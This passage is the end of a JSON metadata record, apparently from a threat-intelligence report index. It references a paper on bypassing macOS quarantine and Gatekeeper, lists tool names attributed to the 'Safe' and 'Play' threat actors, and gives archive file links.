            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-26 - All Your Macs Are Belong To Us- bypassing macOS's file quarantine, gatekeeper, and notarization requirements.pdf"
    ],
    "report_names": [
        "2021-04-26 - All Your Macs Are Belong To Us- bypassing macOS's file quarantine, gatekeeper, and notarization requirements.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535537,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787442,
    "ts_modification_date": 1653787442,
    "files": {
        "pdf": "https://archive.orkl.eu/5ff99701eb910b5d2f297be1a6019842c7dfd7b8.pdf",
        "text": "https://archive.orkl.eu/5ff99701eb910b5d2f297be1a6019842c7dfd7b8.txt",
        "img": "https://archive.orkl.eu/5ff99701eb910b5d2f297be1a6019842c7dfd7b8.jpg"
    }
}